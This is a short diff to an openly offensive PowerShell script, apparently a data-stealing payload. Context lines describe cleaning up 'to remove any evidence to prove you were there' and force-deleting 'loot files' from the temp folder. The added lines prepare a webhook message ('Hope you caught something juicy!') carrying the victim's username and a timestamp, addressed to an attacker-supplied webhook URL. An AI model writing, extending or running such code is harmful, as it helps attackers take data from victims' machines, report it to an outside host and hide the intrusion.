@@ -2220,6 +2220,15 @@ if ($pers -eq 'Remove') {
 	This is to clean up behind you and remove any evidence to prove you were there
 #>
 
+$text = "**__Done!__**: Hope you caught something juicy! :pirate_flag:. Cleaning up in the background :broom: ..."
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
+  'content' = $text
+}
+
 # Delete loot files 
 
 Remove-Item $env:TEMP\$FolderName\* -r -Force -ErrorAction SilentlyContinue
